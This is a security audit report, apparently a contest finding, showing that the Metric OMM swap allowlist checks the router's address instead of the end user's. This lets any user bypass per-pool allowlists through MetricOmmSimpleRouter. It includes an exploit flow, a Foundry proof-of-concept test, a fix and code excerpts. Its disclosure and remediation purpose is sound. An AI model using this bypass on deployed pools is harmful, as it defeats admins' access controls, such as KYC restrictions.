Audit Report

## Title
`SwapAllowlistExtension.beforeSwap` checks the router address instead of the end-user, making per-pool swap allowlists bypassable via `MetricOmmSimpleRouter` — (`File: metric-periphery/contracts/extensions/SwapAllowlistExtension.sol`)

## Summary
`SwapAllowlistExtension.beforeSwap` gates swaps by checking the `sender` argument, which `MetricOmmPool.swap()` populates with its own `msg.sender`. When users route through `MetricOmmSimpleRouter`, the router becomes `msg.sender` in the pool context, so the extension checks `allowedSwapper[pool][router]` rather than `allowedSwapper[pool][user]`. Any pool admin who allowlists the router to enable legitimate users to access the pool via the standard periphery path simultaneously opens the gate to every non-allowlisted user, rendering the allowlist ineffective for all router-mediated swaps.

## Finding Description
**Root cause — three-contract chain:**

1. `MetricOmmPool.swap()` calls `_beforeSwap(msg.sender, ...)`, passing the pool's immediate caller as `sender`: [1](#0-0) 

2. `SwapAllowlistExtension.beforeSwap` receives that value as `sender` and checks `allowedSwapper[msg.sender][sender]`, where `msg.sender` is the pool and `sender` is whoever called the pool: [2](#0-1) 

3. `MetricOmmSimpleRouter.exactInputSingle()` calls `pool.swap()` directly without forwarding the original `msg.sender` as a separate `swapper` argument — the router's own address becomes the pool's `msg.sender`: [3](#0-2) 

**Exploit flow:**
```
Eve (not allowlisted)
  → MetricOmmSimpleRouter.exactInputSingle(params)
      → pool.swap(recipient, ...)          // msg.sender in pool = router
          → _beforeSwap(msg.sender=router, ...)
              → SwapAllowlistExtension.beforeSwap(sender=router, ...)
                  // checks allowedSwapper[pool][router] — TRUE if admin allowlisted router
                  // Eve's address is never checked
```

**The inescapable dilemma for the pool admin:**

| Router allowlisted? | Legitimate user via router | Non-allowlisted user via router |
|---|---|---|
| No | Blocked (UX broken) | Blocked |
| Yes | Passes | **Also passes (bypass)** |

There is no configuration that simultaneously allows allowlisted users to use the router and blocks non-allowlisted users from doing the same. The existing test suite only tests the allowlist with direct `TestCaller` instances, never with the router, so this gap is undetected. [4](#0-3) 

## Impact Explanation
This is an admin-boundary break: an unprivileged user bypasses the pool admin's swap access-control configuration through the standard periphery router path. Pools configured with `SwapAllowlistExtension` to restrict trading to specific addresses (e.g., KYC'd users, institutional counterparties) can be accessed by any arbitrary user via a single `exactInputSingle` call. The extension's entire purpose — gating the swap action to a curated set of addresses — is nullified for the primary periphery entry point. This matches the contest's "Admin-boundary break" allowed impact and the explicitly listed "Allowlist path" smart audit pivot (bypass through router). [5](#0-4) 

## Likelihood Explanation
`MetricOmmSimpleRouter` is the standard, documented swap entry point for end users. No special privileges, flash loans, or multi-step setup are required — a single `exactInputSingle` call suffices. Any non-allowlisted user who discovers their direct pool call is blocked can trivially route through the router instead. The bypass is repeatable and unconditional whenever the router is allowlisted. [6](#0-5) 

## Recommendation
Pass the original end-user identity through the swap path so the extension can check it. The cleanest fix mirrors the `addLiquidity` pattern, which already separates `msg.sender` (the caller) from `owner` (the economic actor):

1. **Add an explicit `swapper` parameter to `pool.swap()`** and have `MetricOmmSimpleRouter` populate it with `msg.sender`. `ExtensionCalling._beforeSwap` forwards it to the extension, which checks `allowedSwapper[pool][swapper]` instead of `allowedSwapper[pool][sender]`.
2. **Alternatively, check `recipient`** if the pool's design guarantees the recipient is always the economic beneficiary — this is a weaker fix since `recipient` can be set to an arbitrary address.

Option 1 is the correct fix. [7](#0-6) 

## Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

function test_swapAllowlist_bypassViaRouter() public {
    // Pool admin allowlists alice AND the router so alice can use periphery
    swapExtension.setAllowedToSwap(address(pool), alice, true);
    swapExtension.setAllowedToSwap(address(pool), address(router), true);

    // Add liquidity so there is something to swap
    _addLiquidity(...);

    // Eve is NOT individually allowlisted
    // Eve routes through the public router — sender seen by extension = router address
    vm.prank(eve);
    router.exactInputSingle(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            recipient: eve,
            tokenIn: address(token0),
            zeroForOne: false,
            amountIn: 1000,
            amountOutMinimum: 0,
            priceLimitX64: type(uint128).max,
            deadline: block.timestamp + 1,
            extensionData: ""
        })
    );
    // Eve's swap succeeds — allowlist bypassed
    // allowedSwapper[pool][router] == true passes for Eve
}
```

The check `allowedSwapper[pool][router] == true` passes for Eve because the extension receives the router address as `sender`, not Eve's address. [5](#0-4)

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L182-196)
```text
  function addLiquidity(
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata callbackData,
    bytes calldata extensionData
  ) external nonReentrant(PoolActions.ADD_LIQUIDITY) returns (uint256 amount0Added, uint256 amount1Added) {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Added, amount1Added) = LiquidityLib.addLiquidity(
      _liquidityContext(), owner, salt, deltas, callbackData, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterAddLiquidity(msg.sender, owner, salt, deltas, amount0Added, amount1Added, extensionData);
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L12-13)
```text
  mapping(address pool => mapping(address swapper => bool)) public allowedSwapper;
  mapping(address pool => bool) public allowAllSwappers;
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```
